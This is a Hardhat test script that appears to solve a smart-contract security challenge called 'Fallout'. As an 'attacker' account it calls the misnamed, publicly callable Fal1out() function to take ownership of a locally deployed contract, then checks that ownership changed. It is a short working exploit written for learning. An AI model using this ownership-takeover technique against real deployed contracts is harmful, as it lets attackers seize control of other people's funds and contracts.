const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

const CONTRACT_NAME = "Fallout";
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Fallout = await ethers.getContractFactory(CONTRACT_NAME);
    const fallout = await Fallout.deploy();

    return { fallout, attacker };
  }

  it("Challenge Solved", async function () {
    let tx;
    let { fallout, attacker } = await loadFixture(deployLoadFixture);

    fallout = fallout.connect(attacker);

    // take the ownership
    tx = await fallout.Fal1out();
    await tx.wait();

    // test
    owner = await fallout.owner();
    expect(owner).to.equal(attacker.address);
  });
});
